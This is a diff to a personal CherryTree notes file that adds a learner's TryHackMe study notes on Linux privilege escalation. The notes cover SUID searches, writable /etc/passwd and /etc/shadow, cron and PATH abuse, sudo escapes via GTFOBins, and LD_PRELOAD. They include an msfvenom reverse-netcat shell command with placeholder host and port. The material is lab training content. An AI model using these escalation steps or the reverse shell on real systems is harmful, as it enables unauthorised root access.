@@ -7022,7 +7022,7 @@ basic terms
     </node>
     <node name="Servidores web" unique_id="176" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694987488" ts_lastsave="1694987488"/>
   </node>
-  <node name="TryHackMe" unique_id="149" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939072" ts_lastsave="1706633196">
+  <node name="TryHackMe" unique_id="149" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939072" ts_lastsave="1707184432">
     <rich_text>good url:
 
 TO CHECK VULNERABILITIES
@@ -7048,12 +7048,16 @@ TO CHECK VULNERABILITIES
     <rich_text>
 
 </rich_text>
+    <rich_text link="webs https://gtfobins.github.io/">https://gtfobins.github.io/</rich_text>
+    <rich_text>
+
+</rich_text>
     <rich_text scale="h2">Your Cleverbridge reference number: 431182666</rich_text>
     <rich_text>
 
 </rich_text>
     <rich_text link="webs https://github.com/postfinance/kubenurse">https://github.com/postfinance/kubenurse</rich_text>
-    <node name="Path Beginer" unique_id="192" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="1700447328" ts_lastsave="1706904870">
+    <node name="Path Beginer" unique_id="192" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="1700447328" ts_lastsave="1707255940">
       <node name="Introductory Networking" unique_id="193" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1700447369" ts_lastsave="1700527383">
         <rich_text>OSI Model
 - Application
@@ -7587,7 +7591,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt
 Find the flag
 flag2 in \Windows\system32\config</rich_text>
       </node>
-      <node name="Common linux privesc" unique_id="247" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1706904870" ts_lastsave="1707001376">
+      <node name="Common linux privesc" unique_id="247" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1706904870" ts_lastsave="1707513607">
         <rich_text>Understanding privesc
 - going from a lower permission to a higher permission
 - exploitation of vulnerabilities
@@ -7604,7 +7608,92 @@ flag2 in \Windows\system32\config</rich_text>
 Direction of privilege escalation
 - there two main privilege escalation variants
    → Horizontal privesc, use of different users, with the same privilege level, use to gain another normal privilege user, use of SUID file attached to their home directory
-   → Vertical privesc (privilege elevation), gain higher privileges or access, with an existing account</rich_text>
+   → Vertical privesc (privilege elevation), gain higher privileges or access, with an existing account that you have already comprised, hijacking account with administrator privileges or root privileges
+
+Enumeration
+- LinEnum, simple bash script, performs common commands related to privilefe escalation
+- important that commands execute with LinEnum
+- options:
+   → kernel, information, exploitable available for this machine
+   → we read/write sensitive files, files that any auth user can read and write to
+   → SUID files, interesting items to escalate privileges. SUID is a special type of file permission give to a file
+   → Crontab contents: cron are show here
+
+Abusing SUID/GUID files
+- first step, check files with the SUID/GUID bit set.
+- files to run with permission of owner/group, in this case like root
+- SUID, set of permissions in linux, this is basic in user admin linux, the maximum number pf bits is 7, files with extra bit to owner
+- SUID like: rws-rwx-rwx
+- GUID like: rwx-rws-rwx
+- finding SUID binaries: in manual form: find / -perm -u=s -type f 2&gt;/dev/null
+
+Exploiting writeable /etc/passwd
+- essential information required during login
+- this is a plain text
+- contains a list of system accounts with user ID, group ID, home directory, shell and more
+- total of 7 fields
+
+Escaping vi editor
+- use of sudo -l, to list commands able as a super user, able to run certain commands as a root user without the root password
+- GTFOBins is a curated list of unix binaries that can be exploited
+
+Exploit crontab
+- long-running process that executes commands at specific dates and times
+- see commands: cat /etc/crontab
+- msfvenom -p cmd/unix/reverse_netcat lhost={ip} lport={port} R
+
+Exploting PATH variable
+- an environmental variable in Linux and Unix-like OS which specifies directories that hold executable programs
+- view: echo $PATH
+- basic process like list processes with ps
+- is possible rewrite the PATH variable to a location of our choosing
+
+Sudo - shell escape sequences
+- list programs with sudo permissions: sudo -l
+- use of GTFPbins, using to elevate permissions
+
+Sudo environment vaiables
+- is possible configure certain environment variables
+- to check variables: sudo -l
+- LD_PRELOAD this load a shared object before any others when a program is run and LD_LIBRARY provides a list of directories where shared libraries are searched
+- use of ldd to show libraries before to execute program
+- execute libraries: sudo LD_LIBRARY_PATH=/tmp
+
+Cron jobs, file permissions
+- programs or scripts which users can schedule to run specific times or intervals
+- is located in /etc/crontab
+- </rich_text>
+        <rich_text link="webs https://gtfobins.github.io/gtfobins/tar/">https://gtfobins.github.io/gtfobins/tar/</rich_text>
+        <rich_text>
+
+SUID / GUID executables
+- find all SUID/GUID executables: find / -t</rich_text>
+      </node>
+      <node name="Linux PrivEsc" unique_id="248" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="27" is_bold="0" foreground="" ts_creation="1707255940" ts_lastsave="1707269298">
+        <rich_text>Multiple types of Privileges Escalation
+based in: </rich_text>
+        <rich_text link="webs https://github.com/sagishahar/lpeworkshop">https://github.com/sagishahar/lpeworkshop</rich_text>
+        <rich_text>
+connect with -oHostKeyAlgorithms=+ssh-rsa
+
+Service exploits
+- use of mysql to export, running like root
+- use of UDF (user defined functions), </rich_text>
+        <rich_text link="webs https://www.exploit-db.com/exploits/1518">https://www.exploit-db.com/exploits/1518</rich_text>
+        <rich_text>
+
+Weak File Permissions - readable /etc/shadow
+- contains user password hashes, only readable by root
+- check permissions of /etc/shadow, and show content
+
+Writable file permissions, /etc/shadow
+- create password: mkpasswd -m sha-512 {pass}
+
+Writable file permissions /etc/passwd
+- information about user accounts
+- readable by all world
+- contains user passwords and some versions this saved here
+- password hash: openssl passwd {password}</rich_text>
       </node>
     </node>
     <node name="Pyramid of pain" unique_id="150" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939081" ts_lastsave="1685940575">
